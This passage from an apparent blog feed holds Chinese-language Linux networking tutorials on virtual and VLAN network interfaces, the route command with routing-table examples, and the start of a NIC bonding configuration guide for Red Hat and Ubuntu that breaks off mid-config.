&#x7269;&#x7406;&#x7F51;&#x5361;&#x8FD9;&#x91CC;&#x6307;&#x7684;&#x662F;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x5B9E;&#x9645;&#x7684;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x8BBE;&#x5907;</li><li><strong>&#x5B50;&#x7F51;&#x5361;</strong> &#x5E76;&#x4E0D;&#x662F;&#x5B9E;&#x9645;&#x4E0A;&#x7684;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x8BBE;&#x5907;&#xFF0C;&#x4F46;&#x662F;&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x5728;&#x7CFB;&#x7EDF;&#x4E2D;&#x51FA;&#x73B0;&#xFF0C;&#x5982;<code>eth0:1</code>&#x3001;<code>eth0:2</code>&#x3002;&#x5B83;&#x4EEC;&#x5FC5;&#x987B;&#x8981;&#x4F9D;&#x8D56;&#x4E8E;&#x7269;&#x7406;&#x7F51;&#x5361;&#xFF0C;&#x867D;&#x7136;&#x53EF;&#x4EE5;&#x4E0E;&#x7269;&#x7406;&#x7F51;&#x5361;&#x7684;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x540C;&#x65F6;&#x5728;&#x7CFB;&#x7EDF;&#x4E2D;&#x5B58;&#x5728;&#x5E76;&#x4F7F;&#x7528;&#x4E0D;&#x540C;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x800C;&#x4E14;&#x4E5F;&#x62E5;&#x6709;&#x5B83;&#x4EEC;&#x81EA;&#x5DF1;&#x7684;&#x7F51;&#x7EDC;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x3002;&#x4F46;&#x662F;&#x5F53;&#x5B83;&#x4F9D;&#x8D56;&#x7684;&#x7269;&#x7406;&#x7F51;&#x5361;&#x4E0D;&#x542F;&#x52A8;&#xFF08;Down&#xFF09;&#x65F6;&#xFF0C;&#x8FD9;&#x4E9B;&#x5B50;&#x7F51;&#x5361;&#x5C06;&#x4E0D;&#x80FD;&#x5DE5;&#x4F5C;</li><li><strong>&#x865A;&#x62DF;VLAN&#x7F51;&#x5361;</strong> &#x8FD9;&#x4E9B;&#x865A;&#x62DF;&#x7684;VLAN&#x7F51;&#x5361;&#x4E5F;&#x4E0D;&#x662F;&#x5B9E;&#x9645;&#x4E0A;&#x7684;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x8BBE;&#x5907;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x5728;&#x7CFB;&#x7EDF;&#x4E2D;&#x51FA;&#x73B0;&#xFF0C;&#x4F46;&#x662F;&#x4E0E;&#x5B50;&#x7F51;&#x5361;&#x4E0D;&#x540C;&#x7684;&#x662F;&#xFF0C;&#x5B83;&#x4EEC;&#x6CA1;&#x6709;&#x81EA;&#x5DF1;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x3002;&#x4ED6;&#x4EEC;&#x53EA;&#x662F;&#x901A;&#x8FC7;&#x5C06;&#x7269;&#x7406;&#x7F51;&#x52A0;&#x5165;&#x4E0D;&#x540C;&#x7684;VLAN&#x800C;&#x751F;&#x6210;&#x7684;VLAN&#x865A;&#x62DF;&#x7F51;&#x5361;&#x3002;&#x5982;&#x679C;&#x5C06;&#x7269;&#x7406;&#x7F51;&#x5361;&#x901A;&#x8FC7;vconfig&#x547D;&#x4EE4;&#x6DFB;&#x52A0;&#x5230;&#x591A;&#x4E2A;VLAN&#x4E2D;&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x4F1A;&#x6709;&#x591A;&#x4E2A;VLAN&#x865A;&#x62DF;&#x7F51;&#x5361;&#x51FA;&#x73B0;&#xFF0C;&#x4ED6;&#x4EEC;&#x7684;&#x4FE1;&#x606F;&#x4EE5;&#x53CA;&#x76F8;&#x5173;&#x7684;VLAN&#x4FE1;&#x606F;&#x90FD;&#x662F;&#x4FDD;&#x5B58;&#x5728;/proc/net/vlan/config&#x8FD9;&#x4E2A;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x800C;&#x6CA1;&#x6709;&#x72EC;&#x81EA;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x3002;<br><strong>&#xFF01;</strong> &#x6CE8;&#x610F;&#xFF0C;&#x5F53;&#x9700;&#x8981;&#x542F;&#x7528;VLAN&#x865A;&#x62DF;&#x7F51;&#x5361;&#x5DE5;&#x4F5C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5173;&#x8054;&#x7684;&#x7269;&#x7406;&#x7F51;&#x5361;&#x4E0D;&#x80FD;&#x914D;&#x7F6E;IP&#x5730;&#x5740;&#xFF0C;&#x5E76;&#x4E14;&#xFF0C;&#x8FD9;&#x4E9B;&#x4E3B;&#x7269;&#x7406;&#x7F51;&#x5361;&#x4E0A;&#x7684;&#x5B50;&#x7F51;&#x5361;&#x4E5F;&#x4E0D;&#x80FD;&#x88AB;&#x542F;&#x7528;&#x548C;&#x914D;&#x7F6E;IP&#x5730;&#x5740;&#x4FE1;&#x606F;&#x3002;&#xFF08;&#x9664;&#x4E86;802.1q&#x914D;&#x7F6E;&#x4E0B;&#xFF0C;&#x5728;&#x8BE5;&#x914D;&#x7F6E;&#x4E0B;&#x53EF;&#x4EE5;&#x914D;&#x7F6E;IP&#x5730;&#x5740;&#x7B49;&#x4FE1;&#x606F;&#xFF09;</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;net-tools&amp;#x5DE5;&amp;#x5177;&amp;#x5305;&quot;&gt;&lt;a href=&quot;#net-tools&amp;#x5DE5;&amp;#x5177;&amp;#x5305;&quot; class=&quot;headerlink&quot; title=&quot;net-tools&amp;#x5DE5;&amp;#x5177;&amp;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux路由配置——route</title>
    <link href="https://marnm.github.io//posts/365d0867/"/>
    <id>https://marnm.github.io//posts/365d0867/</id>
    <published>2022-06-07T04:40:40.000Z</published>
    <updated>2022-06-07T05:20:19.826Z</updated>
    
    <content type="html"><![CDATA[<h1 id="route"><a href="#route" class="headerlink" title="route"></a>route</h1><p>&#x663E;&#x793A;&#x5E76;&#x8BBE;&#x7F6E;Linux&#x4E2D;&#x9759;&#x6001;&#x8DEF;&#x7531;&#x8868;</p><h2 id="&#x8865;&#x5145;&#x8BF4;&#x660E;"><a href="#&#x8865;&#x5145;&#x8BF4;&#x660E;" class="headerlink" title="&#x8865;&#x5145;&#x8BF4;&#x660E;"></a>&#x8865;&#x5145;&#x8BF4;&#x660E;</h2><p><strong>route&#x547D;&#x4EE4;</strong> &#x7528;&#x6765;&#x663E;&#x793A;&#x5E76;&#x8BBE;&#x7F6E;Linux&#x5185;&#x6838;&#x4E2D;&#x7684;&#x7F51;&#x7EDC;&#x8DEF;&#x7531;&#x8868;&#xFF0C;<strong>route&#x547D;&#x4EE4;&#x8BBE;&#x7F6E;&#x7684;&#x8DEF;&#x7531;&#x4E3B;&#x8981;&#x662F;&#x9759;&#x6001;&#x8DEF;&#x7531;</strong>&#x3002;&#x8981;&#x5B9E;&#x73B0;&#x4E24;&#x4E2A;&#x4E0D;&#x540C;&#x7684;&#x5B50;&#x7F51;&#x4E4B;&#x95F4;&#x7684;&#x901A;&#x4FE1;&#xFF0C;&#x9700;&#x8981;&#x4E00;&#x53F0;&#x8FDE;&#x63A5;&#x4E24;&#x4E2A;&#x7F51;&#x7EDC;&#x7684;&#x8DEF;&#x7531;&#x5668;&#xFF0C;&#x6216;&#x8005;&#x540C;&#x65F6;&#x4F4D;&#x4E8E;&#x4E24;&#x4E2A;&#x7F51;&#x7EDC;&#x7684;&#x7F51;&#x5173;&#x6765;&#x5B9E;&#x73B0;&#x3002;</p><p>&#x5728;Linux&#x7CFB;&#x7EDF;&#x4E2D;&#x8BBE;&#x7F6E;&#x8DEF;&#x7531;&#x901A;&#x5E38;&#x662F;&#x4E3A;&#x4E86;&#x89E3;&#x51B3;&#x4EE5;&#x4E0B;&#x95EE;&#x9898;&#xFF1A;&#x8BE5;Linux&#x7CFB;&#x7EDF;&#x5728;&#x4E00;&#x4E2A;&#x5C40;&#x57DF;&#x7F51;&#x4E2D;&#xFF0C;&#x5C40;&#x57DF;&#x7F51;&#x4E2D;&#x6709;&#x4E00;&#x4E2A;&#x7F51;&#x5173;&#xFF0C;&#x80FD;&#x591F;&#x8BA9;&#x673A;&#x5668;&#x8BBF;&#x95EE;Internet&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x9700;&#x8981;&#x5C06;&#x8FD9;&#x53F0;&#x673A;&#x5668;&#x7684;ip&#x5730;&#x5740;&#x8BBE;&#x7F6E;&#x4E3A;Linux&#x673A;&#x5668;&#x7684;&#x9ED8;&#x8BA4;&#x8DEF;&#x7531;&#x3002;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x76F4;&#x63A5;&#x5728;&#x547D;&#x4EE4;&#x884C;&#x4E0B;&#x6267;&#x884C;route&#x547D;&#x4EE4;&#x6765;&#x6DFB;&#x52A0;&#x8DEF;&#x7531;&#xFF0C;&#x4E0D;&#x4F1A;&#x6C38;&#x4E45;&#x4FDD;&#x5B58;&#xFF0C;&#x5F53;&#x7F51;&#x5361;&#x91CD;&#x542F;&#x6216;&#x8005;&#x673A;&#x5668;&#x91CD;&#x542F;&#x4E4B;&#x540E;&#xFF0C;&#x8BE5;&#x8DEF;&#x7531;&#x5C31;&#x5931;&#x6548;&#x4E86;&#xFF1B;&#x53EF;&#x4EE5;&#x5728;<code>/etc/rc.local</code>&#x4E2D;&#x6DFB;&#x52A0;route&#x547D;&#x4EE4;&#x6765;&#x4FDD;&#x8BC1;&#x8BE5;&#x8DEF;&#x7531;&#x8BBE;&#x7F6E;&#x6C38;&#x4E45;&#x6709;&#x6548;&#x3002;</p><h3 id="&#x8BED;&#x6CD5;"><a href="#&#x8BED;&#x6CD5;" class="headerlink" title="&#x8BED;&#x6CD5;"></a>&#x8BED;&#x6CD5;</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route(&#x9009;&#x9879;)(&#x53C2;&#x6570;)</span><br></pre></td></tr></tbody></table></figure><h3 id="&#x9009;&#x9879;"><a href="#&#x9009;&#x9879;" class="headerlink" title="&#x9009;&#x9879;"></a>&#x9009;&#x9879;</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-A&#xFF1A;&#x8BBE;&#x7F6E;&#x5730;&#x5740;&#x7C7B;&#x578B;&#xFF1B;</span><br><span class="line">-C&#xFF1A;&#x6253;&#x5370;&#x5C06;Linux&#x6838;&#x5FC3;&#x7684;&#x8DEF;&#x7531;&#x7F13;&#x5B58;&#xFF1B;</span><br><span class="line">-v&#xFF1A;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#x6A21;&#x5F0F;&#xFF1B;</span><br><span class="line">-n&#xFF1A;&#x4E0D;&#x6267;&#x884C;DNS&#x53CD;&#x5411;&#x67E5;&#x627E;&#xFF0C;&#x76F4;&#x63A5;&#x663E;&#x793A;&#x6570;&#x5B57;&#x5F62;&#x5F0F;&#x7684;IP&#x5730;&#x5740;&#xFF1B;</span><br><span class="line">-e&#xFF1A;netstat&#x683C;&#x5F0F;&#x663E;&#x793A;&#x8DEF;&#x7531;&#x8868;&#xFF1B;</span><br><span class="line">-net&#xFF1A;&#x5230;&#x4E00;&#x4E2A;&#x7F51;&#x7EDC;&#x7684;&#x8DEF;&#x7531;&#x8868;&#xFF1B;</span><br><span class="line">-host&#xFF1A;&#x5230;&#x4E00;&#x4E2A;&#x4E3B;&#x673A;&#x7684;&#x8DEF;&#x7531;&#x8868;&#x3002;</span><br></pre></td></tr></tbody></table></figure><h3 id="&#x53C2;&#x6570;"><a href="#&#x53C2;&#x6570;" class="headerlink" title="&#x53C2;&#x6570;"></a>&#x53C2;&#x6570;</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Add&#xFF1A;&#x589E;&#x52A0;&#x6307;&#x5B9A;&#x7684;&#x8DEF;&#x7531;&#x8BB0;&#x5F55;&#xFF1B;</span><br><span class="line">Del&#xFF1A;&#x5220;&#x9664;&#x6307;&#x5B9A;&#x7684;&#x8DEF;&#x7531;&#x8BB0;&#x5F55;&#xFF1B;</span><br><span class="line">Target&#xFF1A;&#x76EE;&#x7684;&#x7F51;&#x7EDC;&#x6216;&#x76EE;&#x7684;&#x4E3B;&#x673A;&#xFF1B;</span><br><span class="line">gw&#xFF1A;&#x8BBE;&#x7F6E;&#x9ED8;&#x8BA4;&#x7F51;&#x5173;&#xFF1B;</span><br><span class="line">mss&#xFF1A;&#x8BBE;&#x7F6E;TCP&#x7684;&#x6700;&#x5927;&#x533A;&#x5757;&#x957F;&#x5EA6;&#xFF08;MSS&#xFF09;&#xFF0C;&#x5355;&#x4F4D;MB&#xFF1B;</span><br><span class="line">window&#xFF1A;&#x6307;&#x5B9A;&#x901A;&#x8FC7;&#x8DEF;&#x7531;&#x8868;&#x7684;TCP&#x8FDE;&#x63A5;&#x7684;TCP&#x7A97;&#x53E3;&#x5927;&#x5C0F;&#xFF1B;</span><br><span class="line">dev&#xFF1A;&#x8DEF;&#x7531;&#x8BB0;&#x5F55;&#x6240;&#x8868;&#x793A;&#x7684;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x3002;</span><br></pre></td></tr></tbody></table></figure><h3 id="&#x5B9E;&#x4F8B;"><a href="#&#x5B9E;&#x4F8B;" class="headerlink" title="&#x5B9E;&#x4F8B;"></a>&#x5B9E;&#x4F8B;</h3><p> <strong>&#x663E;&#x793A;&#x5F53;&#x524D;&#x8DEF;&#x7531;&#xFF1A;</strong> </p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# route</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination&#xA0;&#xA0;&#xA0;&#xA0; Gateway&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; Genmask&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; Flags Metric Ref&#xA0;&#xA0;&#xA0; Use Iface</span><br><span class="line">112.124.12.0&#xA0;&#xA0;&#xA0; *&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 255.255.252.0&#xA0;&#xA0; U&#xA0;&#xA0;&#xA0;&#xA0; 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 0 eth1</span><br><span class="line">10.160.0.0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; *&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 255.255.240.0&#xA0;&#xA0; U&#xA0;&#xA0;&#xA0;&#xA0; 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 0 eth0</span><br><span class="line">192.168.0.0&#xA0;&#xA0;&#xA0;&#xA0; 10.160.15.247&#xA0;&#xA0; 255.255.0.0&#xA0;&#xA0;&#xA0;&#xA0; UG&#xA0;&#xA0;&#xA0; 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 0 eth0</span><br><span class="line">172.16.0.0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 10.160.15.247&#xA0;&#xA0; 255.240.0.0&#xA0;&#xA0;&#xA0;&#xA0; UG&#xA0;&#xA0;&#xA0; 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 0 eth0</span><br><span class="line">10.0.0.0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 10.160.15.247&#xA0;&#xA0; 255.0.0.0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; UG&#xA0;&#xA0;&#xA0; 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 0 eth0</span><br><span class="line">default&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 112.124.15.247&#xA0; 0.0.0.0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; UG&#xA0;&#xA0;&#xA0; 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 0&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 0 eth1</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# route -n</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</span><br><span class="line">112.124.12.0    0.0.0.0         255.255.252.0   U     0      0        0 eth1</span><br><span class="line">10.160.0.0      0.0.0.0         255.255.240.0   U     0      0        0 eth0</span><br><span class="line">192.168.0.0     10.160.15.247   255.255.0.0     UG    0      0        0 eth0</span><br><span class="line">172.16.0.0      10.160.15.247   255.240.0.0     UG    0      0        0 eth0</span><br><span class="line">10.0.0.0        10.160.15.247   255.0.0.0       UG    0      0        0 eth0</span><br><span class="line">0.0.0.0         112.124.15.247  0.0.0.0         UG    0      0        0 eth1</span><br></pre></td></tr></tbody></table></figure><p>&#x5176;&#x4E2D;Flags&#x4E3A;&#x8DEF;&#x7531;&#x6807;&#x5FD7;&#xFF0C;&#x6807;&#x8BB0;&#x5F53;&#x524D;&#x7F51;&#x7EDC;&#x8282;&#x70B9;&#x7684;&#x72B6;&#x6001;&#xFF0C;Flags&#x6807;&#x5FD7;&#x8BF4;&#x660E;&#xFF1A;</p><ul><li>U Up&#x8868;&#x793A;&#x6B64;&#x8DEF;&#x7531;&#x5F53;&#x524D;&#x4E3A;&#x542F;&#x52A8;&#x72B6;&#x6001;&#x3002;</li><li>H Host&#xFF0C;&#x8868;&#x793A;&#x6B64;&#x7F51;&#x5173;&#x4E3A;&#x4E00;&#x4E3B;&#x673A;&#x3002;</li><li>G Gateway&#xFF0C;&#x8868;&#x793A;&#x6B64;&#x7F51;&#x5173;&#x4E3A;&#x4E00;&#x8DEF;&#x7531;&#x5668;&#x3002;</li><li>R Reinstate Route&#xFF0C;&#x4F7F;&#x7528;&#x52A8;&#x6001;&#x8DEF;&#x7531;&#x91CD;&#x65B0;&#x521D;&#x59CB;&#x5316;&#x7684;&#x8DEF;&#x7531;&#x3002;</li><li>D Dynamically,&#x6B64;&#x8DEF;&#x7531;&#x662F;&#x52A8;&#x6001;&#x6027;&#x5730;&#x5199;&#x5165;&#x3002;</li><li>M Modified&#xFF0C;&#x6B64;&#x8DEF;&#x7531;&#x662F;&#x7531;&#x8DEF;&#x7531;&#x5B88;&#x62A4;&#x7A0B;&#x5E8F;&#x6216;&#x5BFC;&#x5411;&#x5668;&#x52A8;&#x6001;&#x4FEE;&#x6539;&#x3002;</li><li><p>! &#x8868;&#x793A;&#x6B64;&#x8DEF;&#x7531;&#x5F53;&#x524D;&#x4E3A;&#x5173;&#x95ED;&#x72B6;&#x6001;&#x3002;</p><p><strong>&#x6DFB;&#x52A0;&#x7F51;&#x5173;/&#x8BBE;&#x7F6E;&#x7F51;&#x5173;&#xFF1A;</strong> </p></li></ul><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route add -net 224.0.0.0 netmask 240.0.0.0 dev eth0    #&#x589E;&#x52A0;&#x4E00;&#x6761;&#x5230;&#x8FBE;244.0.0.0&#x7684;&#x8DEF;&#x7531;&#x3002;</span><br></pre></td></tr></tbody></table></figure><p> <strong>&#x5C4F;&#x853D;&#x4E00;&#x6761;&#x8DEF;&#x7531;&#xFF1A;</strong> </p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route add -net 224.0.0.0 netmask 240.0.0.0 reject     #&#x589E;&#x52A0;&#x4E00;&#x6761;&#x5C4F;&#x853D;&#x7684;&#x8DEF;&#x7531;&#xFF0C;&#x76EE;&#x7684;&#x5730;&#x5740;&#x4E3A;224.x.x.x&#x5C06;&#x88AB;&#x62D2;&#x7EDD;&#x3002;</span><br></pre></td></tr></tbody></table></figure><p> <strong>&#x5220;&#x9664;&#x8DEF;&#x7531;&#x8BB0;&#x5F55;&#xFF1A;</strong> </p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route del -net 224.0.0.0 netmask 240.0.0.0</span><br><span class="line">route del -net 224.0.0.0 netmask 240.0.0.0 reject</span><br></pre></td></tr></tbody></table></figure><p> <strong>&#x5220;&#x9664;&#x548C;&#x6DFB;&#x52A0;&#x8BBE;&#x7F6E;&#x9ED8;&#x8BA4;&#x7F51;&#x5173;&#xFF1A;</strong> </p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route del default gw 192.168.120.240</span><br><span class="line">route add default gw 192.168.120.240</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;route&quot;&gt;&lt;a href=&quot;#route&quot; class=&quot;headerlink&quot; title=&quot;route&quot;&gt;&lt;/a&gt;route&lt;/h1&gt;&lt;p&gt;&amp;#x663E;&amp;#x793A;&amp;#x5E76;&amp;#x8BBE;&amp;#x7F6E;Linux&amp;#x4E2D;&amp;#x97
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux网卡聚合及bond模式的原理</title>
    <link href="https://marnm.github.io//posts/f20e14fd/"/>
    <id>https://marnm.github.io//posts/f20e14fd/</id>
    <published>2022-06-07T04:40:22.000Z</published>
    <updated>2022-06-07T05:20:35.218Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Linux&#x7F51;&#x5361;&#x805A;&#x5408;&#x914D;&#x7F6E;"><a href="#Linux&#x7F51;&#x5361;&#x805A;&#x5408;&#x914D;&#x7F6E;" class="headerlink" title="Linux&#x7F51;&#x5361;&#x805A;&#x5408;&#x914D;&#x7F6E;"></a>Linux&#x7F51;&#x5361;&#x805A;&#x5408;&#x914D;&#x7F6E;</h2><h3 id="bonding"><a href="#bonding" class="headerlink" title="bonding"></a>bonding</h3><h4 id="Redhat&#x7CFB;&#x5217;"><a href="#Redhat&#x7CFB;&#x5217;" class="headerlink" title="Redhat&#x7CFB;&#x5217;"></a>Redhat&#x7CFB;&#x5217;</h4><p>&#x6DFB;&#x52A0;2&#x5757;&#x7269;&#x7406;&#x7F51;&#x5361;<br>&#x4FEE;&#x6539;&#x7F51;&#x5361;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</p><blockquote><p>&#x9ED8;&#x8BA4;&#x7F51;&#x5361;&#x4EE5;ifcfg-ens33&#x4E3A;&#x4F8B;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/sysconfig/network-scripts/</span><br><span class="line">cp ifcfg-ens33 ifcfg-bond_static</span><br><span class="line">cp ifcfg-ens33 ifcfg-ens38</span><br><span class="line"><span class="built_in">echo</span> &gt; ifcfg-bond_static</span><br></pre></td></tr></tbody></table></figure><p></p></blockquote><p>&#x4FEE;&#x6539;&#x7269;&#x7406;&#x7F51;&#x5361;&#x914D;&#x7F6E;&#x6587;&#x4EF6;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vim ifcfg-ens33</span><br><span class="line">TYPE=Ethernet</span><br><span class="line">BOOTPROT=none</span><br><span class="line">DEVICE=ens33</span><br><span class="line">NAME=ens33</span><br><span class="line">ONBOOT=yes</span><br><span class="line">MASTER=bond_static  <span class="comment"># &#x4E3B;&#x7F51;&#x5361;=bong_static</span></span><br><span class="line">SLAVE=yes   <span class="comment"># &#x4ECE;&#x7F51;&#x5361;=yes</span></span><br></pre></td></tr></tbody></table></figure><p></p><hr><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vim ifcfg-ens38</span><br><span class="line">TYPE=Ethernet</span><br><span class="line">BOOTPROTO=none</span><br><span class="line">DEVICE=ens38</span><br><span class="line">NAME=ens38</span><br><span class="line">ONBOOT=yes</span><br><span class="line">MASTER=bond_static</span><br><span class="line">SLAVE=yes</span><br></pre></td></tr></tbody></table></figure><p>&#x4FEE;&#x6539;bond&#x914D;&#x7F6E;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vim ifcfg-bond_static</span><br><span class="line">TYPE=Ethernet</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">DEVICE=bond_static</span><br><span class="line">NAME=bond_static</span><br><span class="line">IPADDR=192.168.x.x</span><br><span class="line">PREFIX=24</span><br><span class="line">GATEWAY=192.168.X.X</span><br><span class="line">DNS1=X.X.X.X</span><br><span class="line">DNS2=X.X.X.X</span><br><span class="line">ONBOOT=yes</span><br><span class="line">BONDING_MASTER=yes  <span class="comment"># &#x662F;&#x5426;&#x4E3B;&#x7F51;&#x5361;=yes</span></span><br><span class="line">BONDING_OPTS=<span class="string">&quot;miimon=100 mode=6&quot;</span>    <span class="comment"># MII&#x76D1;&#x63A7;&#x65F6;&#x95F4;&#x95F4;&#x9694;=100&#x6BEB;&#x79D2;&#xFF0C;&#x7ED1;&#x5B9A;&#x6A21;&#x5F0F;=6</span></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="Debian&#x7CFB;&#x5217;"><a href="#Debian&#x7CFB;&#x5217;" class="headerlink" title="Debian&#x7CFB;&#x5217;"></a>Debian&#x7CFB;&#x5217;</h4><blockquote><p>&#x4EE5;Ubuntu 20.04&#x4E3A;&#x4F8B;<br><strong>&#x6DFB;&#x52A0;2&#x5757;&#x7269;&#x7406;&#x7F51;&#x5361;</strong><br>&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF1A;<br>sudo vim /etc/netplan/01-network-manager-all.yaml<br></p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">  renderer:</span> <span class="string">NetworkManager</span></span><br><span class="line"><span class="attr">  